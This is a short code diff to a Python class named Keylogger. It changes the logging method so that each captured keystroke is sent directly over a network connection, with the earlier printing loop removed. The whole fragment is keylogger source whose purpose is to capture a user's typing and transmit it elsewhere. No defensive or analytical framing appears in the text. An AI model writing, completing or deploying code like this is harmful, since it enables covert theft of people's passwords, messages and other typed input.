@@ -30,9 +30,7 @@ class Keylogger:
         input()
 
     def log(self, key):
-        while key.char != 'esc':
-            print(key.char + "   key")
-            self.conn.send(str(key.char).encode())
+        self.conn.send(str(key.char).encode())
 
     def stop(self):
         self.listener.stop()
